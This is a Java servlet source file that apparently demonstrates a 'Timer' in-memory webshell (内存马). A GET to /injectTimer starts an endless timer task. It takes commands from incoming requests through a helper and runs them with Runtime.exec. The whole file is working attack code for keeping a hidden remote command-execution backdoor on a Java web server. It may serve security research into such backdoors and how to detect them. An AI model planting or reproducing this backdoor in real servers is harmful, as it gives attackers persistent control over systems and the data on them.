package com;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.HashSet;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import static com.Utils.getRequest;

@WebServlet("/injectTimer")
public class InjectTimer extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("Timer 内存马 init");
        final HashSet<Object> set = new HashSet<Object>();
        Timer exec = new Timer();
        exec.schedule(new TimerTask() {
            public void run() {
                while (true) {
                    List<Object> list = getRequest();
                    if (list.size() == 2) {
                        if (!set.contains(list.get(0))) {
                            set.add(list.get(0));
                            System.out.println(set);
                            try {
                                Runtime.getRuntime().exec(list.get(1).toString());
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
        } ,0 ,1);
    }
}
